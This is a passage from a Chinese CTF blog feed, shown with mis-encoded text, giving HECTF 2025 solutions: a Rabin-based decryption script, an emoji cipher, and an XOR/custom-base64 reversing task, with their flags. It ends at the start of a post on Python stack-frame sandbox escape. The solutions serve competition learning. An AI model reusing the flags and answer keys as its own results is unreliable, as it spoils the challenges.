class="string">f&quot;ç¬¬2æ¬¡å¼€æ–¹ï¼ˆå¾—åˆ°m^2çš„å€™é€‰è§£ï¼‰ï¼šå…±<span class="subst">&#123;<span class="built_in">len</span>(candidates_2)&#125;</span>ä¸ª&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç¬¬3æ¬¡å¼€æ–¹ï¼šå¯¹æ¯ä¸ªx2ï¼Œæ±‚è§£ x3Â² â‰¡ x2 mod n â†’ x3 = mï¼ˆæœ€ç»ˆæ˜æ–‡å€™é€‰ï¼‰</span></span><br><span class="line">    candidates_3 = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> x2 <span class="keyword">in</span> candidates_2:</span><br><span class="line">        res = rabin_sqrt(x2, p, q, n)</span><br><span class="line">        candidates_3.update(res)</span><br><span class="line">    candidates_3 = <span class="built_in">list</span>(candidates_3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ç¬¬3æ¬¡å¼€æ–¹ï¼ˆå¾—åˆ°mçš„å€™é€‰è§£ï¼‰ï¼šå…±<span class="subst">&#123;<span class="built_in">len</span>(candidates_3)&#125;</span>ä¸ª&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># éªŒè¯å€™é€‰è§£ï¼šç¡®ä¿m^8 â‰¡ c mod nï¼ˆè¿‡æ»¤æ— æ•ˆè§£ï¼‰</span></span><br><span class="line">    valid_m = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> candidates_3:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(m, e, n) == c:</span><br><span class="line">            valid_m.append(m)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> valid_m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_flag</span>(<span class="params">valid_m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç­›é€‰æœ‰æ•ˆflagï¼ˆå¯æ‰“å°å­—ç¬¦ã€å«flagæ ¼å¼ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n========== å¼€å§‹ç­›é€‰æœ‰æ•ˆflag ==========&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> idx, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(valid_m):</span><br><span class="line">        <span class="comment"># ä¸¤ç§å­—èŠ‚è½¬æ¢æ–¹å¼ï¼ˆå…¼å®¹ä¸åŒåº“ï¼‰</span></span><br><span class="line">        bytes1 = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">        bytes2 = libnum.n2s(<span class="built_in">int</span>(m))</span><br><span class="line">        <span class="comment"># å°è¯•è§£ç ä¸ºå¯æ‰“å°å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text1 = bytes1.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            text2 = bytes2.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            text1 = <span class="string">&quot;æ— æ³•è§£ç &quot;</span></span><br><span class="line">            text2 = <span class="string">&quot;æ— æ³•è§£ç &quot;</span></span><br><span class="line">        <span class="comment"># æ‰“å°å€™é€‰ç»“æœ</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nå€™é€‰è§£<span class="subst">&#123;idx+<span class="number">1</span>&#125;</span>ï¼š&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æ˜æ–‡mï¼š<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;long_to_bytesç»“æœï¼š<span class="subst">&#123;bytes1&#125;</span> | è§£ç åï¼š<span class="subst">&#123;text1&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;libnum.n2sç»“æœï¼š<span class="subst">&#123;bytes2&#125;</span> | è§£ç åï¼š<span class="subst">&#123;text2&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># ç­›é€‰å«flagæ ‡è¯†çš„æœ‰æ•ˆç»“æœ</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> text1 <span class="keyword">or</span> <span class="string">&quot;FLAG&quot;</span> <span class="keyword">in</span> text1 <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> text2 <span class="keyword">or</span> <span class="string">&quot;FLAG&quot;</span> <span class="keyword">in</span> text2:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;â˜… æ‰¾åˆ°æœ‰æ•ˆflagï¼š<span class="subst">&#123;text1 <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> text1 <span class="keyword">else</span> text2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> m, text1 <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> text1 <span class="keyword">else</span> text2</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\næœªè‡ªåŠ¨ç­›é€‰åˆ°flagï¼Œè¯·æ‰‹åŠ¨æŸ¥çœ‹å€™é€‰è§£ä¸­çš„å¯æ‰“å°å­—ç¬¦ä¸²&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1. è¿ç»­3æ¬¡Rabinå¼€æ–¹ï¼Œæ±‚è§£æ‰€æœ‰æœ‰æ•ˆæ˜æ–‡å€™é€‰</span></span><br><span class="line">    valid_m_list = solve_e8_with_rabin(c, p, q, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\néªŒè¯åæœ‰æ•ˆæ˜æ–‡å€™é€‰æ•°ï¼š<span class="subst">&#123;<span class="built_in">len</span>(valid_m_list)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. ç­›é€‰å¹¶è¾“å‡ºflag</span></span><br><span class="line">    final_m, final_flag = filter_flag(valid_m_list)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. æœ€ç»ˆç»“æœæ±‡æ€»</span></span><br><span class="line">    <span class="keyword">if</span> final_flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n========== è§£å¯†å®Œæˆ ==========&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœ€ç»ˆæ˜æ–‡mï¼š<span class="subst">&#123;final_m&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœ€ç»ˆflagï¼š<span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n========== è§£å¯†ç»“æŸï¼šæœªæ‰¾åˆ°æ˜ç¡®flagï¼Œè¯·æ‰‹åŠ¨æ ¸å¯¹å€™é€‰è§£ ==========&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment">#æœ€ç»ˆflagï¼šHECTF&#123;this_is_a_flag_emm_is_a_true_flag_ok_all_right&#125;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> MISC</h1><h2 id="ç­¾åˆ°"><a class="markdownIt-Anchor" href="#ç­¾åˆ°">#</a> <strong>ç­¾åˆ°</strong></h2><blockquote><p>å…³æ³¨å‡Œæ­¦ç§‘æŠ€å¾®ä¿¡å…¬ä¼—å·ï¼Œå…³æ³¨å…¬ä¼—å·åå‘é€ â€œ2025HECTFï¼Œå¯åŠ¨ï¼ï¼ï¼â€ï¼Œè·å¾—å°æƒŠå–œï¼ï¼ï¼</p></blockquote><p>â€‹åšæ³•å°±æ˜¯é¢˜ç›®æè¿°å­—é¢æ„æ€ã€‚</p><h2 id="check_in"><a class="markdownIt-Anchor" href="#check_in">#</a> <strong>Check_In</strong></h2><blockquote><p>ğŸµ ğŸ‘ğŸ²âš½ğŸ‰ ğŸšƒ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf i love u -&gt; ğŸ¹ğŸ€ğŸŒº ğŸµ ğŸ‘ğŸ²âš½ğŸ‰ ğŸšƒ</span><br><span class="line">$flag -&gt; ğŸŒ¹ğŸ‰ğŸ¹ğŸ€ğŸŒº&#123;ğŸš‡ğŸ‰ğŸ‘ğŸ¹ğŸ²âš¾ğŸ‰_ğŸ€ğŸ²_ğŸŒ¹ğŸ‰ğŸ¹ğŸ€ğŸŒº_ğŸŒ¹ğŸ²ğŸ‰ğŸ‰_ğŸ’ğŸ²ğŸšƒ_ğŸ¹ğŸ“ğŸŒ¾_ğŸ‰ğŸŒ¾ğŸ‡ğŸ²ğŸ’_ğŸµğŸ€&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™å‡ ä¸ªæ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œhectf å°±æ˜¯ğŸŒ¹ğŸ‰ğŸ¹ğŸ€ğŸŒºï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œä¹‹åå¾—åˆ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hectf&#123;ğŸš‡elcoâš¾e_to_hectf_hoğŸ‰e_ğŸ’ou_cğŸ“ğŸŒ¾_eğŸŒ¾ğŸ‡oğŸ’_it&#125;</span><br></pre></td></tr></table></figure><p>â€‹çœ‹èµ·æ¥è¿™ä¸ª flag æ˜¯å¯è¯»çš„ï¼Œæ‰¾ ai çœ‹ç€æ¥æ¥å›å›è„‘æ´æ¨æµ‹å¯èƒ½æ˜¯ welcome to hectf hope you can enjoy itï¼Œæœ€åçš„ flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;welcome<span class="built_in">_</span>to<span class="built_in">_</span>hectf<span class="built_in">_</span>hope<span class="built_in">_</span>you<span class="built_in">_</span>can<span class="built_in">_</span>enjoy<span class="built_in">_</span>it&#125;</span><br></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse">#</a> Reverse</h1><h2 id="easyree"><a class="markdownIt-Anchor" href="#easyree">#</a> <strong>easyree</strong></h2><p>â€‹åç¼–è¯‘ä¹‹åï¼Œä¸‰ä¸ªå‡½æ•°ï¼Œå…ˆçœ‹ç¬¬ä¸€ä¸ªï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1389</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  std::string::<span class="built_in">basic_string</span>();</span><br><span class="line">  std::string::<span class="built_in">reserve</span>(a1, <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(a1, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">char</span>)(byte_2040[i] ^ <span class="number">0x55</span>));</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸€ä¸ªå¼‚æˆ–ï¼Œæå–æ•°æ®ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="number">15</span>,  <span class="number">12</span>,  <span class="number">13</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">6</span>,   <span class="number">7</span>,   <span class="number">4</span>,</span><br><span class="line">        <span class="number">5</span>,  <span class="number">26</span>,  <span class="number">27</span>,  <span class="number">24</span>,  <span class="number">25</span>,  <span class="number">30</span>,  <span class="number">31</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">18</span>,</span><br><span class="line">       <span class="number">19</span>,  <span class="number">16</span>,  <span class="number">17</span>,  <span class="number">22</span>,  <span class="number">23</span>,  <span class="number">20</span>,  <span class="number">47</span>,  <span class="number">44</span>,  <span class="number">45</span>,  <span class="number">34</span>,</span><br><span class="line">       <span class="number">35</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">38</span>,  <span class="number">39</span>,  <span class="number">36</span>,  <span class="number">37</span>,  <span class="number">58</span>,  <span class="number">59</span>,  <span class="number">56</span>,</span><br><span class="line">       <span class="number">57</span>,  <span class="number">62</span>,  <span class="number">63</span>,  <span class="number">60</span>,  <span class="number">61</span>,  <span class="number">50</span>,  <span class="number">51</span>,  <span class="number">48</span>,  <span class="number">49</span>,  <span class="number">54</span>,</span><br><span class="line">       <span class="number">55</span>,  <span class="number">52</span>, <span class="number">108</span>, <span class="number">109</span>,  <span class="number">98</span>,  <span class="number">99</span>,  <span class="number">96</span>,  <span class="number">97</span>, <span class="number">102</span>, <span class="number">103</span>,</span><br><span class="line">      <span class="number">100</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">122</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>â€‹ç¬¬äºŒä¸ªå‡½æ•°ï¼Œä¹Ÿæ˜¯å¼‚æˆ–ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_143F</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  std::string::<span class="built_in">basic_string</span>();</span><br><span class="line">  std::string::<span class="built_in">reserve</span>();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">48</span>; ++i )</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(a1, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">char</span>)(byte_2080[i] ^ <span class="number">0x33</span>));</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æå–æ•°æ®ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars2[] =</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="number">123</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>,   <span class="number">1</span>,  <span class="number">68</span>,   <span class="number">4</span>,</span><br><span class="line">                <span class="number">118</span>,  <span class="number">91</span>, <span class="number">113</span>,  <span class="number">82</span>, <span class="number">106</span>,  <span class="number">84</span>, <span class="number">125</span>,  <span class="number">11</span>,   <span class="number">3</span>,  <span class="number">10</span>,</span><br><span class="line">                <span class="number">125</span>, <span class="number">102</span>,   <span class="number">3</span>,  <span class="number">81</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">113</span>,  <span class="number">82</span>,  <span class="number">75</span>,  <span class="number">66</span>,</span><br><span class="line">                <span class="number">126</span>,  <span class="number">92</span>, <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">75</span>,  <span class="number">87</span>,  <span class="number">75</span>,  <span class="number">66</span>, <span class="number">102</span>,  <span class="number">67</span>,</span><br><span class="line">                <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">71</span>,  <span class="number">80</span>,  <span class="number">69</span>, <span class="number">100</span>, <span class="number">102</span>,   <span class="number">3</span></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>â€‹è§£å¯†è„šæœ¬ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="number">15</span>,  <span class="number">12</span>,  <span class="number">13</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">6</span>,   <span class="number">7</span>,   <span class="number">4</span>,</span><br><span class="line">            <span class="number">5</span>,  <span class="number">26</span>,  <span class="number">27</span>,  <span class="number">24</span>,  <span class="number">25</span>,  <span class="number">30</span>,  <span class="number">31</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">18</span>,</span><br><span class="line">           <span class="number">19</span>,  <span class="number">16</span>,  <span class="number">17</span>,  <span class="number">22</span>,  <span class="number">23</span>,  <span class="number">20</span>,  <span class="number">47</span>,  <span class="number">44</span>,  <span class="number">45</span>,  <span class="number">34</span>,</span><br><span class="line">           <span class="number">35</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">38</span>,  <span class="number">39</span>,  <span class="number">36</span>,  <span class="number">37</span>,  <span class="number">58</span>,  <span class="number">59</span>,  <span class="number">56</span>,</span><br><span class="line">           <span class="number">57</span>,  <span class="number">62</span>,  <span class="number">63</span>,  <span class="number">60</span>,  <span class="number">61</span>,  <span class="number">50</span>,  <span class="number">51</span>,  <span class="number">48</span>,  <span class="number">49</span>,  <span class="number">54</span>,</span><br><span class="line">           <span class="number">55</span>,  <span class="number">52</span>, <span class="number">108</span>, <span class="number">109</span>,  <span class="number">98</span>,  <span class="number">99</span>,  <span class="number">96</span>,  <span class="number">97</span>, <span class="number">102</span>, <span class="number">103</span>,</span><br><span class="line">          <span class="number">100</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">122</span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">64</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;base64è¡¨å¼‚æˆ–åï¼š&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; i++)&#123;</span><br><span class="line">        temp[i] = ida_chars[i] ^ <span class="number">0x55</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,temp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ida_chars2[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">123</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>,   <span class="number">1</span>,  <span class="number">68</span>,   <span class="number">4</span>,</span><br><span class="line">                    <span class="number">118</span>,  <span class="number">91</span>, <span class="number">113</span>,  <span class="number">82</span>, <span class="number">106</span>,  <span class="number">84</span>, <span class="number">125</span>,  <span class="number">11</span>,   <span class="number">3</span>,  <span class="number">10</span>,</span><br><span class="line">                    <span class="number">125</span>, <span class="number">102</span>,   <span class="number">3</span>,  <span class="number">81</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">113</span>,  <span class="number">82</span>,  <span class="number">75</span>,  <span class="number">66</span>,</span><br><span class="line">                    <span class="number">126</span>,  <span class="number">92</span>, <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">75</span>,  <span class="number">87</span>,  <span class="number">75</span>,  <span class="number">66</span>, <span class="number">102</span>,  <span class="number">67</span>,</span><br><span class="line">                    <span class="number">112</span>,   <span class="number">5</span>,  <span class="number">71</span>,  <span class="number">80</span>,  <span class="number">69</span>, <span class="number">100</span>, <span class="number">102</span>,   <span class="number">3</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp2[<span class="number">64</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å¯†æ–‡å¼‚æˆ–åï¼š&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)&#123;</span><br><span class="line">        temp2[i] = ida_chars2[i] ^ <span class="number">0x33</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,temp2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¾“å‡ºç»“æœï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64è¡¨å¼‚æˆ–åï¼šZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/</span><br><span class="line">å¯†æ–‡å¼‚æˆ–åï¼šHVEWEVA2w7EhBaYgN809NU0bACBaxqMoC6xdxqUpC6tcvWU0</span><br></pre></td></tr></table></figure><p>â€‹æ ¹æ®è¾“å‡ºç»“æœçœ‹å‡ºæ¥æ˜¯ base64 å˜è¡¨ï¼Œè§£ç å¾—åˆ° flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;welc0m3<span class="built_in">_</span>t0<span class="built_in">_</span>rev3r3e<span class="built_in">_</span>w0r1d<span class="built_in">_</span>x1x1&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;pre&gt;&lt;code&gt;	ç¬¬ä¸€å¤©æ‰“å¾—å¤´ç–¼çœ¼ç›ç–¼ï¼Œæˆ‘ä»¥ä¸ºæ˜¯è¢«è„‘æ´ç»™å¹²çƒ‚äº†ï¼Œç»“æœæ˜¯tmæ„Ÿå†’äº†ï¼Œå›å»åƒä¸ªè¯ç§’å¥½äº†ï¼Œä½†æ˜¯è„‘æ´å¤ªéš¾èšŒäº†ï¼Œç¬¬äºŒå¤©æ‰“èˆèŒå»äº†ï¼Œæ²¡è§£åé¢çš„é¢˜äº†ï¼Œä¸è¿‡å¹¸å¥½æ²¡çœ‹ï¼Œåé¢æœ‰äº›é¢˜è¿˜çœŸä¸å¤§å¥½å†™ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;mark</summary>
      
    
    
    
    <category term="CTFerçš„æ¯”èµ›ä¹‹è·¯" scheme="http://blog.g01den.top/categories/Game/"/>
    
    
    <category term="Game" scheme="http://blog.g01den.top/tags/Game/"/>
    
  </entry>
  
  <entry>
    <title>Pythonæ ˆå¸§é€ƒé€¸</title>
    <link href="http://blog.g01den.top/posts/2d792864.html"/>
    <id>http://blog.g01den.top/posts/2d792864.html</id>
    <published>2026-02-03T14:25:29.000Z</published>
    <updated>2026-02-05T09:55:36.352Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pythonæ ˆå¸§é€ƒé€¸"><a class="markdownIt-Anchor" href="#pythonæ ˆå¸§é€ƒé€¸">#</a> Python æ ˆå¸§é€ƒé€¸ï¼š</h1><h2 id="1-yield-è¯­ä¸ç”Ÿæˆå™¨å‡½æ•°"><a class="markdownIt-Anchor" href="#1-yield-è¯­ä¸ç”Ÿæˆå™¨å‡½æ•°">#</a> 1ã€yield è¯­ä¸ç”Ÿæˆå™¨å‡½æ•°ï¼š</h2><p>â€‹python ä¸­çš„ yield è¯­å¥ç”¨äºå®šä¹‰ç”Ÿæˆå™¨å‡½æ•°ï¼Œå®ƒèƒ½è®©å‡½æ•°åœ¨è¿è¡Œè¿‡ç¨‹ä¸­æš‚åœå¹¶ä¿å­˜å½“å‰çŠ¶æ€ï¼Œåç»­å†æ¢å¤æ‰§è¡Œã€‚</p><p>â€‹ç”Ÿæˆå™¨ æ˜¯  Pythonn ä¸­ä¸€ç§ç‰¹æ®Šçš„è¿­ä»£å™¨ï¼Œå®ƒå¯ä»¥åœ¨è¿­ä»£è¿‡ç¨‹ä¸­åŠ¨æ€ç”Ÿæˆå€¼ï¼Œè€Œä¸éœ€è¦ä¸€æ¬¡æ€§å°†æ‰€æœ‰å€¼å­˜ 0 å‚¨åœ¨å†…å­˜ä¸­ã€‚</p><p>â€‹ä¸¾ä¸ªç”Ÿæˆå™¨çš„ä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç”Ÿæˆå™¨å‡½æ•°ç¬¬ä¸€æ¬¡æ‰§è¡Œ&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç”Ÿæˆå™¨å‡½æ•°ç¬¬äºŒæ¬¡æ‰§è¡Œ&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç”Ÿæˆå™¨å‡½æ•°ç¬¬ä¸‰æ¬¡æ‰§è¡Œ&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gen = func()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen))</span><br><span class="line"><span class="comment"># frame = [x for x in gen]</span></span><br><span class="line"><span class="comment"># print(frame)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œç»“æœ</span></span><br><span class="line"><span class="comment">#ç”Ÿæˆå™¨å‡½æ•°ç¬¬ä¸€æ¬¡æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"><span class="comment">#ç”Ÿæˆå™¨å‡½æ•°ç¬¬äºŒæ¬¡æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span 